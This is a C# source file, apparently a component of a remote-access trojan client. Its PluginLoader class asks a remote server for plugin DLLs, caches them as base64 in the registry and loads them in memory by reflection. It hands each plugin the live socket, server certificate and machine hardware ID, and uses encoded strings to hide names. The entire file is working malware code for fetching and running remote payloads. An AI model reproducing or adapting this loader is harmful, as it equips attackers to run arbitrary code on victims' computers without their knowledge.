using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using Leb128;

namespace Client.Helper;

internal class PluginLoader
{
	public static List<object[]> invokes = new List<object[]>();

	public static void SaveInvoke(object[] objects, Client client)
	{
		SetRegistry.SetValue((string)objects[1], Convert.ToBase64String((byte[])objects[2]));
		foreach (object[] item in invokes.ToList())
		{
			if ((string)item[0] == (string)objects[1])
			{
				client.Disconnect();
				Load(item, Program.client);
				invokes.Remove(item);
			}
		}
	}

	public static void Invoke(object[] objects, Client client)
	{
		if (SetRegistry.GetValue((string)objects[1]) == null)
		{
			Client client2 = new Client();
			string[] array = client.socket.RemoteEndPoint.ToString().Split(new char[1] { ':' });
			client2.Connect(array[0], array[1]);
			client2.Send(LEB128.Write(new object[2]
			{
				EncryptString.Decode("GetDLL"),
				(string)objects[1]
			}));
			invokes.Add(new object[2]
			{
				(string)objects[1],
				(byte[])objects[2]
			});
		}
		else
		{
			Load(new object[2]
			{
				(string)objects[1],
				(byte[])objects[2]
			}, Program.client);
		}
	}

	public static void Load(object[] Messages, Client client)
	{
		try
		{
			Type? type = AppDomain.CurrentDomain.Load(Convert.FromBase64String(SetRegistry.GetValue((string)Messages[0]))).GetType(EncryptString.Decode("Plugin.Plugin"));
			object obj = Activator.CreateInstance(type);
			MethodInfo method = type.GetMethod(EncryptString.Decode("Run"));
			object[] parameters = new object[4]
			{
				client.socket,
				Config.ServerCertificate,
				Config.Hwid,
				(byte[])Messages[1]
			};
			method.Invoke(obj, parameters);
		}
		catch (Exception ex)
		{
			client.Error(EncryptString.Decode("Load error: ") + ex.ToString());
		}
	}
}
